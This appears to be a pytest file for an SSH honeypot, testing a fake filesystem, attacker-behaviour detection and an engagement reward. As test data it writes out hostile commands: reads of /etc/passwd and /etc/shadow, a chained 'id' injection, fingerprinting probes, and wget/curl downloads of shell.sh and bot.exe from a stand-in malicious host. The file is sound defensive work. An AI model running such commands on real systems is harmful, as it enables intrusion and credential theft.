import pytest
from backend.honeypot.fake_filesystem import FakeFilesystem
from backend.core.feature_extractor import extract_features
from backend.core.cooperative_rl_engine import calculate_joint_reward
from backend.models.session import AttackerSession

def test_stateful_filesystem_ops():
    fs = FakeFilesystem()
    assert fs.pwd() == "/root"

    # mkdir stateful
    res_mkdir = fs.mkdir("/tmp/tools")
    assert res_mkdir == ""

    # cd stateful
    res_cd = fs.cd("/tmp/tools")
    assert res_cd == ""
    assert fs.pwd() == "/tmp/tools"

    # touch stateful
    res_touch = fs.touch("test.txt")
    assert res_touch == ""

    # ls stateful
    ls_out = fs.ls()
    assert "test.txt" in ls_out

    # chmod stateful
    res_chmod = fs.chmod("+x", "test.txt")
    assert res_chmod == ""

    # ls -l stateful
    ls_l_out = fs.ls(long_format=True)
    assert "-rwxr-xr-x" in ls_l_out
    assert "test.txt" in ls_l_out

def test_path_traversal_and_command_injection_safety():
    fs = FakeFilesystem()
    
    # Path traversal protection test in virtual filesystem
    res_cd_escaped = fs.cd("/../../../../etc")
    assert fs.pwd() == "/etc"
    
    cat_shadow = fs.cat("/etc/shadow")
    assert "permission denied" in cat_shadow

    # Feature extractor security indicator tests
    feat_traversal = extract_features("127.0.0.1", 22, "ssh", "cat /etc/passwd", {"event": "command"})
    assert feat_traversal["has_path_traversal"] == 1

    feat_cmd_inj = extract_features("127.0.0.1", 22, "ssh", "cat /etc/passwd; id", {"event": "command"})
    assert feat_cmd_inj["has_command_injection"] == 1

def test_fingerprinting_detection():
    fingerprint_cmds = [
        "cat /proc/version",
        "cat /proc/1/cmdline",
        "uname -a",
        "ls /proc",
        "ls /sys",
        "systemctl",
        "mount",
        "dmesg",
        "iptables -l",
        "ps aux",
        "ss -tulpn"
    ]
    for cmd in fingerprint_cmds:
        feat = extract_features("127.0.0.1", 22, "ssh", cmd, {"event": "command"})
        assert feat["is_fingerprinting_attempt"] == 1, f"Failed to detect fingerprinting for: {cmd}"

def test_download_attempt_detection():
    download_cmds = [
        "wget http://malicious.test/shell.sh",
        "curl -O http://malicious.test/bot.exe"
    ]
    for cmd in download_cmds:
        feat = extract_features("127.0.0.1", 22, "ssh", cmd, {"event": "command"})
        assert feat["is_payload_download_attempt"] == 1, f"Failed to detect download for: {cmd}"

def test_consistent_fake_os_responses():
    from backend.honeypot.ssh_server import dispatch_command, HOSTNAME
    fs = FakeFilesystem()
    
    # Test OS/hostname consistency
    assert dispatch_command(fs, "hostname") == HOSTNAME
    assert HOSTNAME in dispatch_command(fs, "cat /etc/hostname")
    assert "Ubuntu" in dispatch_command(fs, "cat /etc/os-release")
    assert "5.15.0-91-generic" in dispatch_command(fs, "uname -r")
    assert "Mem:" in dispatch_command(fs, "free -h")
    assert "Filesystem" in dispatch_command(fs, "df -h")

def test_joint_reward_calculation_bounds():
    session_good = AttackerSession(
        session_duration=45.0,
        interaction_depth=4,
        fingerprinting_attempts=3,
        download_attempts=1,
        attack_types=["brute_force", "command_injection"]
    )
    reward_good = calculate_joint_reward(session_good, 0.9)
    assert 20.0 <= reward_good <= 50.0

    session_bad = AttackerSession(
        session_duration=0.5,
        interaction_depth=1,
        fingerprinting_attempts=0,
        download_attempts=0,
        attack_types=[]
    )
    reward_bad = calculate_joint_reward(session_bad, 0.1)
    assert -20.0 <= reward_bad <= 5.0
